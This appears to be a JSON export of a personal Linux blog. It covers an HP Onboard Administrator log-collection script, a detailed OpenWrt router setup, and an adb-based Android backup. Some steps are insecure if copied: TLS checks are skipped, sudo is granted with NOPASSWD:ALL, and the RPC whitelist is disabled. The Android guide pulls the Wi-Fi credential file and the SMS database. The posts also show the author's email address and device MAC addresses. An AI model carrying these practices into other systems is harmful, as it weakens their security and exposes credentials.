DESTINATION=\"./log_directory/\" WGET=\"wget --no-proxy --user=$USER --password=$PASSWORD --no-check-certificate\" cat &gt; /tmp/hpoa.xml &lt;&lt; EOF &lt;?xml version=\"1.0\"?&gt; &lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:wsu=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\" xmlns:wsse=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd\" xmlns:hpoa=\"hpoa.xsd\"&gt; &lt;SOAP-ENV:Body&gt; &lt;hpoa:userLogIn&gt; &lt;hpoa:username&gt;$USER&lt;/hpoa:username&gt; &lt;hpoa:password&gt;$PASSWORD&lt;/hpoa:password&gt; &lt;/hpoa:userLogIn&gt; &lt;/SOAP-ENV:Body&gt; &lt;/SOAP-ENV:Envelope&gt; EOF OASESSIONKEY=$(curl --noproxy '*' --silent --data @/tmp/hpoa.xml --insecure https://$IP/hpoa | sed -n 's@.*&lt;hpoa:oaSessionKey&gt;\\(.*\\)&lt;/hpoa:oaSessionKey&gt;.*@\\1@p') curl --noproxy '*' --cookie \"encLocalKey=$OASESSIONKEY; encLocalUser=$USER\" --insecure https://$IP/cgi-bin/showAll -o $DESTINATION/$IP-showAll curl --noproxy '*' --cookie \"encLocalKey=$OASESSIONKEY; encLocalUser=$USER\" --insecure https://$IP/cgi-bin/getConfigScript -o $DESTINATION/$IP-getConfigScript $WGET https://$IP/xmldata?item=all -O $DESTINATION/$IP.xml Enjoy :-)" }, { "title": "TP-Link TL-WR1043ND and OpenWrt 12.09 with two SSIDs (MultiSSID) - private and guest", "url": "/posts/tp-link-tl-wr1043nd-and-openwrt-1209-with-two-ssids-multissid-private-and-guest/", "categories": "OpenWrt, Networking, linux.xvx.cz", "tags": "tp-link, router, wifi", "date": "2013-08-03 00:00:00 +0200", "content": "Original post from linux.xvx.cz I decided to change my home network to match the following “network diagram”: The core part of the design is TP-Link TL-WR1043ND wifi router running OpenWrt with a small 16GB USB stick /dev/sda1 containing ext3 partition with OpenWrt configuration + swap. There is also a 16GB USB stick and 2 thermometers connected using USB Serial connector (bought on eBay): I’m going to use the last stable version of the OpenWrt firmware: openwrt-ar71xx-generic-tl-wr1043nd-v1-squashfs-sysupgrade.bin Upgrade the firmware and remove the old configuration: rm -r /tmp/opkg-lists/ sysctl -w vm.drop_caches=1 sysupgrade -v -n https://downloads.openwrt.org/attitude_adjustment/12.09/ar71xx/generic/openwrt-ar71xx-generic-tl-wr1043nd-v1-squashfs-sysupgrade.bin Here are the notes how way how I configured it. If you don’t like the commands feel free to check the configs here: https://github.com/ruzickap/linux.xvx.cz/tree/gh-pages/files/openwrt Configure the system, ssh on port 2222 and LAN + wifi IP: telnet 192.168.1.1 passwd #Erase ALL #rm -r /overlay/* #mtd -r erase rootfs_data opkg update opkg install block-mount kmod-fs-ext4 kmod-usb-storage uci set system.@system[0].hostname=gate uci set system.@system[0].timezone=CET-1CEST,M3.5.0,M10.5.0/3 uci set system.@system[0].timezone=CET-1CEST,M3.5.0,M10.5.0/3 uci set system.@system[0].log_file=/etc/messages uci set system.@system[0].log_size=1024 uci set system.@system[0].log_type=file uci set dropbear.@dropbear[0].Port=2222 uci set system.@timeserver[0].enable_server=1 uci add firewall rule uci set firewall.@rule[-1].name=ssh uci set firewall.@rule[-1].src=wan uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=tcp uci set firewall.@rule[-1].dest_port=2222 uci add firewall redirect uci set firewall.@redirect[-1].name=ssh_lan uci set firewall.@redirect[-1].src=lan uci set firewall.@redirect[-1].proto=tcp uci set firewall.@redirect[-1].src_dport=22 uci set firewall.@redirect[-1].dest_port=2222 uci set firewall.@redirect[-1].dest_ip=192.168.0.1 uci set network.lan.ipaddr=192.168.0.1 uci set network.lan.netmask=255.255.255.0 uci set dhcp.lan.start=200 uci set dhcp.lan.limit=54 uci set dhcp.@dnsmasq[0].domain=xvx.cz uci set dhcp.@dnsmasq[0].leasefile=/etc/dnsmasq-dhcp.leases uci set dhcp.@dnsmasq[0].port=0 uci set dhcp.@dnsmasq[0].cachelocal=0 uci set dhcp.lan.dhcp_option=6,8.8.8.8 uci set dhcp.wifi_open.dhcp_option=6,8.8.8.8 uci add fstab mount uci set fstab.@mount[-1].device=/dev/sda1 uci set fstab.@mount[-1].fstype=ext3 uci set fstab.@mount[-1].options=rw,sync,noatime,nodiratime uci set fstab.@mount[-1].enabled=1 uci set fstab.@mount[-1].enabled_fsck=0 uci set fstab.@mount[-1].is_rootfs=1 uci set fstab.@swap[0].enabled=1 Configure the private wifi: uci add wireless wifi-iface uci set wireless.@wifi-iface[-1].device=radio0 uci set wireless.@wifi-iface[-1].network=lan uci set wireless.@wifi-iface[-1].mode=ap uci set wireless.@wifi-iface[-1].ssid=peru_private uci set wireless.@wifi-iface[-1].encryption=psk2+tkip+aes uci set wireless.@wifi-iface[-1].key=xxxxxxxx uci set wireless.radio0.channel=8 uci set wireless.radio0.country=CZ uci set wireless.radio0.htmode=HT40- uci set wireless.radio0.noscan=1 uci set wireless.radio0.bursting=1 uci set wireless.radio0.ff=1 uci set wireless.radio0.compression=1 uci set wireless.radio0.xr=1 uci set wireless.radio0.ar=1 uci set wireless.radio0.txpower=20 uci del wireless.@wifi-device[0].disabled Configure the wifi_open - guest wifi access. For some reason OpenWrt Guest WLAN is not working for me. I found this article (Polish) https://eko.one.pl/forum/viewtopic.php?id=2937 how to do it. #Use your default MAC + 1 - my router's original MAC is 94:0C:6D:AC:55:AC MAC=\"96:0C:6D:AC:55:AD\" uci set network.wifi_open=interface uci set network.wifi_open.ifname=eth0.3 uci set network.wifi_open.type=bridge uci set network.wifi_open.macaddr=$MAC uci set network.wifi_open.proto=static uci set network.wifi_open.ipaddr=10.0.0.1 uci set network.wifi_open.netmask=255.255.255.0 uci set wireless.@wifi-iface[0].ssid=medlanky.xvx.cz uci set wireless.@wifi-iface[0].network=wifi_open uci set wireless.@wifi-iface[0].encryption=none uci set wireless.@wifi-iface[0].isolate=1 uci set wireless.@wifi-iface[0].macaddr=$MAC uci add firewall zone uci set firewall.@zone[-1].name=wifi_open uci set firewall.@zone[-1].input=REJECT uci set firewall.@zone[-1].output=ACCEPT uci set firewall.@zone[-1].forward=REJECT uci add firewall forwarding uci set firewall.@forwarding[-1].src=wifi_open uci set firewall.@forwarding[-1].dest=wan uci add firewall rule uci set firewall.@rule[-1].name=icmp-echo-request uci set firewall.@rule[-1].src=wifi_open uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=icmp uci set firewall.@rule[-1].icmp_type=echo-request uci add firewall rule uci set firewall.@rule[-1].name=dhcp uci set firewall.@rule[-1].src=wifi_open uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=udp uci set firewall.@rule[-1].src_port=67-68 uci set firewall.@rule[-1].dest_port=67-68 uci add firewall rule uci set firewall.@rule[-1].name=dns uci set firewall.@rule[-1].src=wifi_open uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=tcpudp uci set firewall.@rule[-1].dest_port=53 uci set dhcp.wifi_open=dhcp uci set dhcp.wifi_open.interface=wifi_open uci set dhcp.wifi_open.start=2 uci set dhcp.wifi_open.limit=253 uci set dhcp.wifi_open.dhcp_option=6,8.8.8.8 uci set dhcp.wifi_open.leasetime=1h uci commit dhcp sed -i \"/dnsmasq-dhcp.leases/a list 'interface' 'lan'\" /etc/config/dhcp sed -i \"/dnsmasq-dhcp.leases/a list 'interface' 'wifi_open'\" /etc/config/dhcp rm /etc/resolv.conf cat &gt; /etc/resolv.conf &lt;&lt; EOF search xvx.cz nameserver 8.8.8.8 EOF Define the DHCP static hosts: # WiFi uci add dhcp host uci set dhcp.@host[-1].name=peru-nb-work-wifi uci set dhcp.@host[-1].ip=192.168.0.2 uci set dhcp.@host[-1].mac=00:26:c6:51:39:34 uci add dhcp host uci set dhcp.@host[-1].name=andy-nb-wifi uci set dhcp.@host[-1].ip=192.168.0.3 uci set dhcp.@host[-1].mac=74:f0:6d:93:c7:3a uci add dhcp host uci set dhcp.@host[-1].name=peru-nb-old-wifi uci set dhcp.@host[-1].ip=192.168.0.4 uci set dhcp.@host[-1].mac=00:15:00:11:48:5A uci add dhcp host uci set dhcp.@host[-1].name=andy-android-wifi uci set dhcp.@host[-1].ip=192.168.0.5 uci set dhcp.@host[-1].mac=00:23:76:D6:42:C7 uci add dhcp host uci set dhcp.@host[-1].name=peru-android-work-wifi uci set dhcp.@host[-1].ip=192.168.0.6 uci set dhcp.@host[-1].mac=00:90:4c:c5:00:34 uci add dhcp host uci set dhcp.@host[-1].name=peru-palm-wifi uci set dhcp.@host[-1].ip=192.168.0.7 uci set dhcp.@host[-1].mac=00:0b:6c:57:da:9a uci add dhcp host uci set dhcp.@host[-1].name=RTL8187-wifi uci set dhcp.@host[-1].ip=192.168.0.8 uci set dhcp.@host[-1].mac=00:C0:CA:54:F5:BA # NIC uci add dhcp host uci set dhcp.@host[-1].name=peru-nb-work-nic uci set dhcp.@host[-1].ip=192.168.0.130 uci set dhcp.@host[-1].mac=00:22:68:1a:14:5d uci add dhcp host uci set dhcp.@host[-1].name=andy-nb-nic uci set dhcp.@host[-1].ip=192.168.0.131 uci set dhcp.@host[-1].mac=20:cf:30:31:da:b3 uci add dhcp host uci set dhcp.@host[-1].name=peru-nb-old-nic uci set dhcp.@host[-1].ip=192.168.0.132 uci set dhcp.@host[-1].mac=00:13:D4:D1:03:57 uci add dhcp host uci set dhcp.@host[-1].name=peru-tv-nic uci set dhcp.@host[-1].ip=192.168.0.133 uci set dhcp.@host[-1].mac=00:12:FB:94:1B:9A uci add dhcp host uci set dhcp.@host[-1].name=raspberrypi-nic uci set dhcp.@host[-1].ip=192.168.0.134 uci set dhcp.@host[-1].mac=b8:27:eb:8c:97:9e uci add dhcp host uci set dhcp.@host[-1].name=server-nic uci set dhcp.@host[-1].ip=192.168.0.135 uci set dhcp.@host[-1].mac=00:1f:c6:e9:f5:14 Configure the ssh to enable autologin: scp \"$HOME/.ssh/id_rsa.pub\" root@192.168.1.1:/tmp/authorized_keys ssh root@192.168.1.1 cp /tmp/authorized_keys /etc/dropbear/authorized_keys chmod 600 /etc/dropbear/authorized_keys uci set dropbear.@dropbear[0].RootPasswordAuth=off uci commit reboot Repeat the steps above to save all the changes/files to the external USB storage. Install the following packages: opkg update opkg install bind-dig bzip2 collectd-mod-conntrack collectd-mod-cpu collectd-mod-df collectd-mod-disk collectd-mod-dns collectd-mod-exec collectd-mod-irq collectd-mod-memory collectd-mod-ping collectd-mod-processes collectd-mod-syslog collectd-mod-tcpconns ddns-scripts digitemp ethtool file gzip htop kmod-usb-serial-pl2303 less lftp lighttpd-mod-cgi lighttpd-mod-proxy lsof luci-app-statistics luci-app-transmission luci-app-upnp luci-app-vnstat luci-app-wol luci-app-qos luci-app-ddns luci-app-firewall opkg install luci-app-watchcat mc mtr nmap nodogsplash openssh-sftp-server openssl-util rsync screen shadow-useradd ssmtp sudo sysstat tcpdump transmission-remote transmission-web vnstati wget zoneinfo-europe Add my user and configure mc, screen and shell: mkdir -p /usr/lib/mc/extfs.d touch /etc/mc/sfs.ini wget --no-check-certificate https://raw.github.com/MidnightCommander/mc/master/misc/filehighlight.ini -O /etc/mc/filehighlight.ini mkdir -p /etc/skel/.mc/ chmod 700 /etc/skel/.mc cat &gt; /etc/skel/.mc/ini &lt;&lt; EOF [Midnight-Commander] auto_save_setup=0 drop_menus=1 use_internal_edit=1 confirm_exit=0 [Layout] menubar_visible=0 message_visible=0 EOF cp -r /etc/skel/.mc /root/ wget --no-check-certificate https://raw.github.com/MidnightCommander/mc/master/contrib/mc-wrapper.sh.in -O - | sed 's|@bindir@/mc|/usr/bin/mc --nomouse|' &gt; /usr/bin/mc-wrapper.sh chmod a+x /usr/bin/mc-wrapper.sh echo \"ruzickap ALL=(ALL) NOPASSWD:ALL\" &gt;&gt; /etc/sudoers cat &gt;&gt; /etc/screenrc &lt;&lt; EOF defscrollback 1000 startup_message off termcapinfo xterm ti@:te@ hardstatus alwayslastline '%{= kG}[ %{G}%H %{g}][%= %{= kw}%?%-Lw%?%{r}(%{W}%n*%f%t%?(%u)%?%{r})%{w}%?%+Lw%?%?%= %{g}][%{B} %d/%m %{W}%c %{g}]' vbell off EOF cat &gt;&gt; /etc/profile &lt;&lt; \\EOF if [ $USER == \"root\" ]; then PS1='\\[\\033[01;31m\\]\\h\\[\\033[01;34m\\] \\W \\$\\[\\033[00m\\] ' else PS1='\\[\\033[01;32m\\]\\u@\\h\\[\\033[01;34m\\] \\w \\$\\[\\033[00m\\] ' fi [ -x /usr/bin/mc-wrapper.sh ] &amp;&amp; alias mc='. /usr/bin/mc-wrapper.sh --nomouse' alias ssh='ssh -y -i $HOME/.ssh/id_rsa' EOF # shellcheck disable=SC2016 # Single quotes intentional - backticks expand on router, not locally sed -i '/^exit 0/i echo -e \"Subject: Reboot `uci get system.@system[0].hostname`.`uci get dhcp.@dnsmasq[0].domain`\\\\n\\\\nOpenwrt rebooted: `date; uptime`\\\\n\\\\n`grep -B 50 \\\\\"syslogd started\\\\\" /etc/messages`\" | sendmail petr.ruzicka@gmail.com' /etc/rc.local sed -i 's/HISTORY=3/HISTORY=30/' /etc/sysstat/config mkdir /home useradd --shell /bin/ash --password \"$(openssl passwd -1 xxxx)\" --create-home --comment \"Petr Ruzicka\" ruzickap mkdir /home/ruzickap/.ssh cp /etc/dropbear/authorized_keys /home/ruzickap/.ssh/ chown -R ruzickap:ruzickap /home/ruzickap/.ssh cat &gt; /etc/rsyncd.conf &lt;&lt; EOF max connections = 3 timeout = 300 dont compress = * [data] comment = data path = /data read only = yes list = yes EOF echo \"vm.swappiness=5\" &gt;&gt; /etc/sysctl.conf Configure the DDNS - duckdns.org: uci set ddns.myddns.enabled=1 uci set ddns.myddns.service_name=duckdns.org uci set ddns.myddns.domain=gate uci set ddns.myddns.username=NA uci set ddns.myddns.password=xxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx uci set ddns.myddns.ip_source=network uci set ddns.myddns.ip_network=wan uci set ddns.myddns.force_interval=72 uci set ddns.myddns.force_unit=hours uci set ddns.myddns.check_interval=10 uci set ddns.myddns.check_unit=minutes uci set 'ddns.myddns.update_url=http://www.duckdns.org/update?domains=[DOMAIN]&amp;token=[PASSWORD]&amp;ip=[IP]' Here are some details about thermometers: DS18S20 article https://martybugs.net/electronics/tempsensor/hardware.cgi Configure thermometers: digitemp_DS9097 -a -i -c /etc/digitemp.conf -s /dev/ttyUSB0 cat &gt; /etc/digitemp.script &lt;&lt; EOF #!/bin/sh /usr/bin/digitemp_DS9097 -c/etc/digitemp.conf -a -n0 -d10 -q -s/dev/ttyUSB0 -o\"PUTVAL $(uci get system.@system[0].hostname)/temp/temperature-%s interval=10 %N:%.2C\" EOF chmod a+x /etc/digitemp.script Replace uhttpd by lighttpd, configure SSL and mod_proxy for Transmission: /etc/init.d/uhttpd disable /etc/init.d/uhttpd stop /etc/init.d/lighttpd enable mkdir -p /www/myadmin/luci mv /www/index.html /www/myadmin/luci/ wget --no-check-certificate https://raw.github.com/ruzickap/medlanky.xvx.cz/gh-pages/index.html -O - | sed 's@facebook.com/medlanky@xvx.cz@g;s/UA-6594742-7/UA-6594742-8/' &gt; /www/index.html uci add firewall rule uci set firewall.@rule[-1].name=https uci set firewall.@rule[-1].src=wan uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=tcp uci set firewall.@rule[-1].dest_port=443 uci add firewall rule uci set firewall.@rule[-1].name=http uci set firewall.@rule[-1].src=wan uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=tcp uci set firewall.@rule[-1].dest_port=80 mkdir -p /etc/lighttpd/ssl/xvx.cz chmod 0600 /etc/lighttpd/ssl/xvx.cz SUBJ=\" C=CZ ST=Czech Republic O=XvX, Inc. localityName=Brno commonName=xvx.cz Certificate Authority \" openssl req -new -x509 -subj \"$(echo -n \"$SUBJ\" | tr \"\\n\" \"/\")\" -keyout /etc/lighttpd/ssl/xvx.cz/server.pem -out /etc/lighttpd/ssl/xvx.cz/server.pem -days 3650 -nodes cat &gt;&gt; /etc/lighttpd/lighttpd.conf &lt;&lt; \\EOF server.port = 80 $SERVER[\"socket\"] == \":443\" { ssl.engine = \"enable\" ssl.pemfile = \"/etc/lighttpd/ssl/xvx.cz/server.pem\" } server.modules = ( \"mod_proxy\", \"mod_cgi\", ) cgi.assign = ( \"luci\" =&gt; \"/usr/bin/lua\" ) server.errorlog-use-syslog = \"enable\" server.dir-listing = \"enable\" $HTTP[\"url\"] =~ \"^/myadmin/transmission*\" { # Use proxy for redirection to Transmission's own web interface proxy.server = ( \"\" =&gt; ( ( \"host\" =&gt; \"127.0.0.1\", \"port\" =&gt; 9091 ) ) ) } EOF Make outgoing emails to reach the SMTP server: sed -i 's/^mailhub=.*/mailhub=mail.upcmail.cz/;s/^rewriteDomain=.*/rewriteDomain=xvx.cz/' /etc/ssmtp/ssmtp.conf Configure TFTPboot and dnsmasq script: mkdir /tftpboot wget -P /tftpboot http://static.netboot.me/gpxe/netbootme.kpxe uci set dhcp.@dnsmasq[0].enable_tftp=1 uci set dhcp.@dnsmasq[0].tftp_root=/tftpboot uci set dhcp.@dnsmasq[0].dhcp_boot=netbootme.kpxe echo \"dhcp-script=/etc/dnsmasq-script.sh\" &gt;&gt; /etc/dnsmasq.conf cat &gt; /etc/dnsmasq-script.sh &lt;&lt; \\EOF #!/bin/sh if [ \"$1\" == \"add\" ] &amp;&amp; ! grep -iq \"$2\" /etc/config/dhcp; then echo -e \"Subject: New MAC on $(uci get system.@system[0].hostname).$(uci get dhcp.@dnsmasq[0].domain)\\\\n\\\\n$(/bin/date +\"%F %T\") $*\" | sendmail petr.ruzicka@gmail.com fi EOF chmod a+x /etc/dnsmasq-script.sh Watchcat is used to monitor network connection “pingability” to 8.8.8.8 otherwise the router is rebooted. Configure QoS: uci set qos.wan.upload=500 # Upload speed in kBits/s uci set qos.wan.download=5000 # Download speed in kBits/s uci set qos.wan.enabled=1 sed -i \"s/'22,53'/'22,2222,53'/\" /etc/config/qos /etc/init.d/qos enable Configure statistics (collectd): mkdir -p /etc/collectd/conf.d uci set luci_statistics.collectd_rrdtool.DataDir=/etc/collectd uci set luci_statistics.collectd_ping.enable=1 uci set luci_statistics.collectd_ping.Hosts=www.google.com uci set luci_statistics.collectd_df.enable=1 uci set luci_statistics.collectd_df.Devices=/dev/sda1 uci set luci_statistics.collectd_df.MountPoints=/overlay uci set luci_statistics.collectd_df.FSTypes=ext3 uci set luci_statistics.collectd_disk.enable=1 uci set luci_statistics.collectd_disk.Disks=sda uci set luci_statistics.collectd_dns.enable=1 uci set luci_statistics.collectd_dns.Interfaces=any uci set luci_statistics.collectd_interface.Interfaces=\"eth0.2 wlan0 wlan0-1 eth0.1\" uci set luci_statistics.collectd_iptables.enable=0 uci set luci_statistics.collectd_irq.enable=1 uci set luci_statistics.collectd_processes.Processes=\"lighttpd collectd transmission-daemon\" uci set luci_statistics.collectd_tcpconns.LocalPorts=\"2222 443 80\" uci set luci_statistics.collectd_olsrd.enable=0 uci set luci_statistics.collectd_rrdtool.CacheTimeout=120 uci set luci_statistics.collectd_rrdtool.CacheFlush=900 uci set luci_statistics.collectd_exec.enable=1 uci commit uci add luci_statistics collectd_exec_input uci set luci_statistics.@collectd_exec_input[-1].cmdline=\"/etc/digitemp.script\" cat &gt; /etc/collectd/conf.d/my_collectd.conf LogLevel \"info\" EOF Configure vnstat - software for monitoring / graphing network throughput: mkdir /etc/vnstat sed -i 's@^\\(DatabaseDir\\).*@\\1 \"/overlay/etc/vnstat\"@' /etc/vnstat.conf vnstat -u -i eth0.2 vnstat -u -i wlan0 vnstat -u -i wlan0-1 vnstat -u -i eth0.1 echo \"*/5 * * * * vnstat -u\" &gt;&gt; /etc/crontabs/root cat &gt; /etc/graphs-vnstat.sh &lt;&lt; \\EOF #!/bin/sh # vnstati image generation script. # Source: https://code.google.com/p/x-wrt/source/browse/package/webif/files/www/cgi-bin/webif/graphs-vnstat.sh WWW_D=/www/myadmin/vnstat # output images to here LIB_D=$(awk -F \\\" '/^DatabaseDir/ { print $2 }' /etc/vnstat.conf) # db location BIN=/usr/bin/vnstati # which vnstati outputs=\"s h d t m\" # what images to generate # Sanity checks [ -d \"$WWW_D\" ] || mkdir -p \"$WWW_D\" # make the folder if it doesn't exist. # End of config changes interfaces=\"$(ls -1 $LIB_D)\" if [ -z \"$interfaces\" ]; then echo \"No database found, nothing to do.\" echo \"A new database can be created with the following command: \" echo \" vnstat -u -i eth0\" exit 0 else for interface in $interfaces; do for output in $outputs; do $BIN -${output} -i $interface -o $WWW_D/vnstat_${interface}_${output}.png done done fi exit 1 EOF chmod a+x /etc/graphs-vnstat.sh echo \"0 2 * * * /etc/graphs-vnstat.sh\" &gt;&gt; /etc/crontabs/root cat &gt; /www/myadmin/vnstat/index.html &lt;&lt; EOF &lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"300\"&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Traffic of OpenWRT interfaces&lt;/title&gt; &lt;/head&gt; &lt;body&gt; EOF for IFCE in \"$(awk -F \\\" '/^DatabaseDir/ { print $2 }' /etc/vnstat.conf)\"/*; do cat &gt;&gt; /www/myadmin/vnstat/index.html &lt;&lt; EOF &lt;h2&gt;Traffic of Interface $IFCE&lt;/h2&gt; &lt;table&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td&gt; &lt;img src=\"vnstat_${IFCE}_s.png\" alt=\"$IFCE Summary\" /&gt; &lt;/td&gt; &lt;td&gt; &lt;img src=\"vnstat_${IFCE}_h.png\" alt=\"$IFCE Hourly\" /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=\"top\"&gt; &lt;img src=\"vnstat_${IFCE}_d.png\" alt=\"$IFCE Daily\" /&gt; &lt;/td&gt; &lt;td valign=\"top\"&gt; &lt;img src=\"vnstat_${IFCE}_t.png\" alt=\"$IFCE Top 10\" /&gt; &lt;br /&gt; &lt;img src=\"vnstat_${IFCE}_m.png\" alt=\"$IFCE Monthly\" /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; EOF done cat &gt;&gt; /www/myadmin/vnstat/index.html &lt;&lt; EOF &lt;/body&gt; &lt;/html&gt; EOF Configure the nodogsplash for wifi_open (guests): mv /etc/nodogsplash/nodogsplash.conf /etc/nodogsplash/nodogsplash.conf-orig cat &gt; /etc/nodogsplash/nodogsplash.conf &lt;&lt; EOF GatewayInterface br-wifi_open FirewallRuleSet authenticated-users { FirewallRule block to 192.168.0.0/16 FirewallRule block to 10.0.0.0/8 FirewallRule allow tcp port 53 FirewallRule allow udp port 53 FirewallRule allow tcp port 80 FirewallRule allow tcp port 443 FirewallRule allow tcp port 22 FirewallRule allow icmp } FirewallRuleSet preauthenticated-users { FirewallRule allow tcp port 53 FirewallRule allow udp port 53 } FirewallRuleSet users-to-router { FirewallRule allow udp port 53 FirewallRule allow tcp port 53 FirewallRule allow udp port 67 FirewallRule allow icmp } GatewayName medlanky.xvx.cz RedirectURL http://medlanky-hotspot.xvx.cz/ ClientForceTimeout 120 EOF sed -i 's@#OPTIONS=\"-s -d 5\"@OPTIONS=\"-s -d 5\"@' /etc/init.d/nodogsplash wget \"http://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Brno-Medl%C3%A1nky_znak.svg/90px-Brno-Medl%C3%A1nky_znak.svg.png\" -O /etc/nodogsplash/htdocs/images/90px-Brno-Medlanky_znak.svg.png cp /etc/nodogsplash/htdocs/splash.html /etc/nodogsplash/htdocs/splash.html-orig sed -i 's@wifidog.png.*@90px-Brno-Medlanky_znak.svg.png\"@;/align=center height=\"120\"&gt;/a\\ \\ \\ &lt;h2&gt;For Internet access - click the sign.&lt;/h2&gt; &lt;h2&gt;Pro pristup na Internet klikni na znak.&lt;/h2&gt;\\ ' /etc/nodogsplash/htdocs/splash.html /etc/init.d/nodogsplash enable Transmission bittorrent client configuration: mkdir -p /data/torrents/torrents-completed /data/torrents/torrents-incomplete /data/torrents/torrents /data/torrents/config ln -s /data/torrents/torrents /home/ruzickap/torrents chown -R ruzickap:ruzickap /data/torrents/torrents uci set transmission.@transmission[-1].enabled=1 uci set transmission.@transmission[-1].config_dir=/data/torrents/config uci set transmission.@transmission[-1].download_dir=/data/torrents/torrents-completed uci set transmission.@transmission[-1].incomplete_dir_enabled=true uci set transmission.@transmission[-1].incomplete_dir=/data/torrents/torrents-incomplete uci set transmission.@transmission[-1].blocklist_enabled=1 uci set \"transmission.@transmission[-1].blocklist_url=&lt;http://list.iblocklist.com/?list=bt_level1&amp;fileformat=p2p&amp;archiveformat=zip&gt;\" uci set transmission.@transmission[-1].speed_limit_down_enabled=true uci set transmission.@transmission[-1].speed_limit_up_enabled=true uci set transmission.@transmission[-1].speed_limit_down=300 uci set transmission.@transmission[-1].speed_limit_up=5 uci set transmission.@transmission[-1].alt_speed_enabled=true uci set transmission.@transmission[-1].alt_speed_down=99999 uci set transmission.@transmission[-1].alt_speed_up=10 uci set transmission.@transmission[-1].alt_speed_time_enabled=true uci set transmission.@transmission[-1].alt_speed_time_day=127 uci set transmission.@transmission[-1].alt_speed_time_begin=60 uci set transmission.@transmission[-1].alt_speed_time_end=420 uci set transmission.@transmission[-1].rpc_whitelist_enabled=false uci set transmission.@transmission[-1].start_added_torrents=true uci set transmission.@transmission[-1].script_torrent_done_enabled=true uci set transmission.@transmission[-1].script_torrent_done_filename=/etc/torrent-done.sh uci set transmission.@transmission[-1].watch_dir_enabled=true uci set transmission.@transmission[-1].watch_dir=/data/torrents/torrents/ uci set transmission.@transmission[-1].rpc_url=/myadmin/transmission/ uci set transmission.@transmission[-1].rpc_authentication_required=true uci set transmission.@transmission[-1].rpc_username=ruzickap uci set transmission.@transmission[-1].rpc_password=xxxx uci set transmission.@transmission[-1].ratio_limit=0 uci set transmission.@transmission[-1].ratio_limit_enabled=true uci set transmission.@transmission[-1].upload_slots_per_torrent=5 uci set transmission.@transmission[-1].trash_original_torrent_files=true uci set transmission.@transmission[-1].download_queue_size=1 uci add firewall rule uci set firewall.@rule[-1].name=transmission uci set firewall.@rule[-1].src=wan uci set firewall.@rule[-1].target=ACCEPT uci set firewall.@rule[-1].proto=tcpudp uci set firewall.@rule[-1].dest_port=51413 /etc/init.d/transmission enable /etc/init.d/miniupnpd enable cat &gt; /etc/torrent-done.sh &lt;&lt; \\EOF ## !/bin/sh echo -e \"Subject: $TR_TORRENT_NAME finished.\\n\\nTransmission finished downloading \\\"$TR_TORRENT_NAME\\\" on $TR_TIME_LOCALTIME\" | /usr/sbin/ssmtp petr.ruzicka@gmail.com EOF chmod a+x /etc/torrent-done.sh uci commit reboot I’m sure you need to customize most of the thing mentioned above, but these notes can still help you. Enjoy :-)" }, { "title": "TL-WR1043ND wifi router with camera and thermometers", "url": "/posts/tl-wr1043nd-wifi-router-with-camera-and-theromometers/", "categories": "OpenWrt, linux.xvx.cz", "tags": "tp-link, router, monitoring", "date": "2013-06-24 00:00:00 +0200", "content": "Original post from linux.xvx.cz Here are a few photos of my 2-year-old TP-Link TL-WR1043ND wifi router. It was getting some pictures from camera using fswebcam and measuring internal/external temperature using digitemp. All that time it was running: BusyBox v1.15.3 (2011-04-30 19:48:15 CEST) built-in shell (ash) Enter 'help' for a list of built-in commands. _______ ________ __ | |.-----.-----.-----.| | | |.----.| |_ | - || _ | -__| || | | || _|| _| |_______|| __|_____|__|__||________||__| |____| |__| W I R E L E S S F R E E D O M Backfire (10.03, r23915) -------------------------- * 1/3 shot Kahlua In a shot glass, layer Kahlua * 1/3 shot Bailey's on the bottom, then Bailey's, * 1/3 shot Vodka then Vodka. --------------------------------------------------- And now it’s waiting for the latest stable OpenWrt release…" }, { "title": "Last post", "url": "/posts/last-post/", "categories": "Linux, linux-old.xvx.cz", "tags": "", "date": "2013-06-08 00:00:00 +0200", "content": "https://linux-old.xvx.cz/2013/06/last-post/ I decided to move this blog to Google’s Blogger, because I don’t want to run my own server (hardware) any more. The domain will be the same, but all the RSS feeds and pages will have a new structure. The Wordpress engine is much better than Google’s, but there are no free hosting services where you can use your own domain (not to buy one). I found just these: GitHub Blogger Tumblr Weebly I’ll do the change in the next month or two… I promise I’ll be more active in writing articles on the new platform. Thanks PetrR" }, { "title": "Notes about upgrade from CyanogenMod 7.0 to 7.2", "url": "/posts/notes-about-upgrade-from-cyanogenmod-70-to-72/", "categories": "Android", "tags": "htc-desire, cyanogenmod, adb", "date": "2013-05-27 00:00:00 +0200", "content": "Not completed… I decided to upgrade my “old” CyanogenMod 7.0 on my HTC Desire to the latest and “greatest” 7.2 version. The steps to do the upgrade were mentioned on the CyanogenMod WiKi and I don’t want to repeat them here. What is important for me is the part about “Wipe data/factory reset”. This is recommended to do it before updating and it’s also mentioned on the wiki page. You can use many tools to backup/restore your data like SMS, Call Log, application’s settings and other data. But I prefer to do it myself using the command line (adb)… Backup part executed on your Linux machine MY_BACKUP_PATH=/var/tmp/android_backup test -d \"$MY_BACKUP_PATH\" || mkdir \"$MY_BACKUP_PATH\" Backup MMS/SMS data: adb shell sqlite3 /data/data/com.android.providers.telephony/databases/mmssms.db 'select * from sms' &gt; \"$MY_BACKUP_PATH/sms\" Backup System WiFi Settings: adb pull /data/misc/wifi/wpa_supplicant.conf 